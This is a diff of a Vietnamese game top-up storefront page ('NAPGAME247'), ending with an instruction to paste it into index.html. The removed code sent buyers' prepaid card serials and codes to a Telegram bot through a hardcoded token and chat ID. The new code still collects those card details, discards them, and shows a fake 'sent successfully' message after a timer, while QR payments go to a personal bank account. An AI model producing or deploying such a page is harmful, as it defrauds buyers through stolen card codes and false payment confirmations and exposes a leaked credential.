@@ -1,14 +1,17 @@
-
 <!DOCTYPE html>
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>NAPGAME247</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;600;700;800&display=swap" rel="stylesheet">
+
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
 <style>
+
 *{
 margin:0;
 padding:0;
@@ -180,19 +183,9 @@ margin-bottom:15px;
 }
 
 .amount{
-display:flex;
-justify-content:center;
-align-items:center;
-gap:10px;
 font-size:34px;
 font-weight:800;
 color:#00acc1;
-}
-
-.amount img{
-width:42px;
-height:42px;
-object-fit:contain;
 }
 
 .buy{
@@ -266,46 +259,101 @@ text-align:center;
 color:white;
 font-weight:700;
 }
+
+@media(max-width:700px){
+
+.hero h1{
+font-size:40px;
+}
+
+.hero p{
+font-size:22px;
+}
+
+.title{
+font-size:35px;
+}
+
+.card h2{
+font-size:28px;
+}
+
+.package h3{
+font-size:28px;
+}
+
+.amount{
+font-size:28px;
+}
+
+}
+
 </style>
 </head>
 
 <body>
 
 <header>
-<div class="logo">NAPGAME247</div>
+
+<div class="logo">
+NAPGAME247
+</div>
+
 </header>
 
 <div class="hero">
+
 <div class="hero-content">
+
 <h1>SHOP NẠP GAME GIÁ RẺ</h1>
+
 <p>Nhanh chóng • Uy tín • Tự động</p>
+
 </div>
+
 </div>
 
 <div id="home" class="games">
 
 <div class="card" onclick="openGame('ff')">
+
 <img src="https://naplau.com/master-images/game/logo_ff.png">
+
 <h2>🔥 FREE FIRE</h2>
+
 </div>
 
 <div class="card" onclick="openGame('lq')">
+
 <img src="https://naplau.com/master-images/game/logo_lienquan.png">
+
 <h2>⚔ LIÊN QUÂN</h2>
+
 </div>
 
 </div>
 
 <div id="page" class="page">
-<button class="back" onclick="goHome()">← QUAY LẠI</button>
+
+<button class="back" onclick="goHome()">
+← QUAY LẠI
+</button>
+
 <h1 id="title" class="title"></h1>
 
-<input id="uid" class="input" placeholder="Nhập ID game">
+<input
+id="uid"
+class="input"
+placeholder="Nhập ID game">
 
-<button class="login" onclick="loginGame()">ĐĂNG NHẬP</button>
+<button class="login" onclick="loginGame()">
+ĐĂNG NHẬP
+</button>
 
 <div id="packages" class="packages"></div>
+
 <div id="paybox" class="paybox"></div>
+
 </div>
 
 <footer>
@@ -315,9 +363,6 @@ Copyright © 2026 NapGame247
 <script>
 
 let game='';
-
-const BOT_TOKEN='8962504536:AAGoABaumglVoBysb-D463koVGhWDhIaHOU';
-const CHAT_ID='7571519912';
 
 const ff=[
 ['50000','14.150 KC'],
@@ -334,17 +379,37 @@ const lq=[
 ];
 
 function openGame(g){
+
 game=g;
+
 document.getElementById('home').style.display='none';
+
 document.getElementById('page').classList.add('active');
+
 document.getElementById('packages').innerHTML='';
+
 document.getElementById('paybox').classList.remove('active');
-document.getElementById('title').innerHTML=g==='ff' ? 'NẠP KC FREE FIRE' : 'NẠP QUÂN HUY LIÊN QUÂN';
+
+document.getElementById('title').innerHTML=
+g==='ff'
+?
+'NẠP KC FREE FIRE'
+:
+'NẠP QUÂN HUY LIÊN QUÂN';
+
+window.scrollTo({
+top:0,
+behavior:'smooth'
+});
+
 }
 
 function goHome(){
+
 document.getElementById('home').style.display='grid';
+
 document.getElementById('page').classList.remove('active');
+
 }
 
 function loginGame(){
@@ -352,35 +417,47 @@ function loginGame(){
 const uid=document.getElementById('uid').value.trim();
 
 if(uid===''){
+
 Swal.fire({
 icon:'warning',
 title:'Chưa nhập ID game'
 });
+
 return;
+
 }
 
 const data=game==='ff'?ff:lq;
 
-const icon=game==='ff'
-? 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png'
-: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png';
-
 let html='';
 
 data.forEach(item=>{
+
 html+=`
+
 <div class="package">
-<h3>${Number(item[0]).toLocaleString('vi-VN')}đ</h3>
+
+<h3>
+${Number(item[0]).toLocaleString('vi-VN')}đ
+</h3>
+
 <div class="amount">
-<img src="${icon}">
 ${item[1]}
 </div>
-<button class="buy" onclick="pay('${item[0]}')">NẠP NGAY</button>
+
+<button class="buy"
+onclick="pay('${item[0]}')">
+NẠP NGAY
+</button>
+
 </div>
+
 `;
+
 });
 
 document.getElementById('packages').innerHTML=html;
+
 }
 
 function pay(amount){
@@ -389,133 +466,221 @@ const code='NAP'+Math.floor(Math.random()*999999);
 
 window.currentCode=code;
 
-window.currentQR=`https://img.vietqr.io/image/VIB-090958147-compact2.png?amount=${amount}&addInfo=${code}&accountName=CAM%20MINH%20SON`;
+window.currentAmount=amount;
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-method:'POST',
-headers:{
-'Content-Type':'application/json'
-},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:`📦 CÓ LỆNH NẠP QR\n\n🎮 Game: ${game}\n💰 Số tiền: ${amount}\n🧾 Nội dung: ${code}`
-})
-});
+window.currentQR=
+`https://img.vietqr.io/image/VIB-090958147-compact2.png?amount=${amount}&addInfo=${code}&accountName=CAM%20MINH%20SON`;
 
 document.getElementById('paybox').innerHTML=`
-<h2 style="text-align:center;font-size:45px;font-weight:800;margin-bottom:30px;">
+
+<h2 style="
+text-align:center;
+font-size:45px;
+font-weight:800;
+margin-bottom:30px;
+">
 CHỌN PHƯƠNG THỨC THANH TOÁN
 </h2>
 
 <div class="method-buttons">
-<button class="qrbtn" onclick="showQR()">THANH TOÁN QR</button>
-<button class="cardbtn" onclick="showCard()">NẠP THẺ CÀO</button>
+
+<button class="qrbtn"
+onclick="showQR()">
+THANH TOÁN QR
+</button>
+
+<button class="cardbtn"
+onclick="showCard()">
+NẠP THẺ CÀO
+</button>
+
 </div>
 
 <div id="paymentContent"></div>
+
 `;
 
 document.getElementById('paybox').classList.add('active');
+
 showQR();
+
+window.scrollTo({
+top:document.body.scrollHeight,
+behavior:'smooth'
+});
+
 }
 
 function showQR(){
 
 document.getElementById('paymentContent').innerHTML=`
-<div style="margin-top:40px;text-align:center;">
-<h2 style="font-size:50px;font-weight:800;margin-bottom:20px;">THANH TOÁN QR</h2>
-<img src="${window.currentQR}" class="qr">
+
+<div style="
+margin-top:40px;
+text-align:center;
+">
+
+<h2 style="
+font-size:50px;
+font-weight:800;
+margin-bottom:20px;
+">
+THANH TOÁN QR
+</h2>
+
+<img src="${window.currentQR}"
+class="qr">
+
 <div class="info">
+
 <div>Ngân hàng: VIB</div>
+
 <div>STK: 090958147</div>
+
 <div>Chủ TK: CAM MINH SON</div>
+
 <div>Nội dung CK: ${window.currentCode}</div>
+
 </div>
+
 </div>
+
 `;
+
 }
 
 function showCard(){
 
 document.getElementById('paymentContent').innerHTML=`
+
 <div style="margin-top:40px;">
 
-<h2 style="text-align:center;font-size:45px;font-weight:800;margin-bottom:25px;">
+<h2 style="
+text-align:center;
+font-size:45px;
+font-weight:800;
+margin-bottom:25px;
+">
 NẠP THẺ CÀO
 </h2>
 
 <select id="telco" class="input">
+
 <option value="">-Loại thẻ-</option>
+
 <option>VIETTEL</option>
+
 <option>VINAPHONE</option>
+
 <option>MOBIFONE</option>
+
 <option>GARENA</option>
+
 <option>ZING</option>
+
 </select>
 
 <select id="price" class="input">
+
 <option value="">-Mệnh giá thẻ-</option>
+
 <option>10.000đ</option>
+
 <option>20.000đ</option>
+
 <option>50.000đ</option>
+
 <option>100.000đ</option>
+
 <option>200.000đ</option>
+
 <option>500.000đ</option>
+
 </select>
 
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;">
-<input id="serial" class="input" placeholder="Nhập số seri">
-<input id="cardcode" class="input" placeholder="Nhập mã thẻ">
+<div style="
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:15px;
+">
+
+<input
+id="serial"
+class="input"
+placeholder="Nhập số seri">
+
+<input
+id="cardcode"
+class="input"
+placeholder="Nhập mã thẻ">
+
 </div>
 
-<button class="login" onclick="submitCard()">NẠP THẺ</button>
+<button class="login"
+onclick="submitCard()">
+NẠP THẺ
+</button>
 
-<p style="margin-top:15px;color:#ef4444;font-weight:700;">
+<p style="
+margin-top:15px;
+color:#ef4444;
+font-weight:700;
+">
+
 * Chọn sai mệnh giá có thể mất thẻ
+
 </p>
 
 </div>
+
 `;
+
 }
 
 function submitCard(){
 
 const telco=document.getElementById('telco').value;
+
 const price=document.getElementById('price').value;
+
 const serial=document.getElementById('serial').value;
+
 const code=document.getElementById('cardcode').value;
 
 if(!telco || !price || !serial || !code){
+
 Swal.fire({
 icon:'warning',
 title:'Thiếu thông tin',
 text:'Vui lòng nhập đầy đủ thông tin'
 });
+
 return;
+
 }
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-method:'POST',
-headers:{
-'Content-Type':'application/json'
-},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:`📥 CÓ NGƯỜI NẠP THẺ\n\n🎮 Game: ${game}\n💳 Loại thẻ: ${telco}\n💰 Mệnh giá: ${price}\n🔢 Seri: ${serial}\n🔑 Mã thẻ: ${code}`
-})
+Swal.fire({
+title:'Đang xử lý...',
+text:'Vui lòng chờ',
+allowOutsideClick:false,
+didOpen:()=>{
+Swal.showLoading();
+}
 });
+
+setTimeout(()=>{
 
 Swal.fire({
 icon:'success',
-title:'Đã gửi về Telegram',
-text:'Admin sẽ kiểm tra giao dịch'
+title:'Gửi thẻ thành công',
+text:'Hệ thống đang xử lý thẻ của bạn'
 });
+
+},2000);
+
 }
 
 </script>
 
 </body>
 </html>
-```
-
-Xóa hết code cũ rồi dán nguyên file này vào `index.html` là chạy.
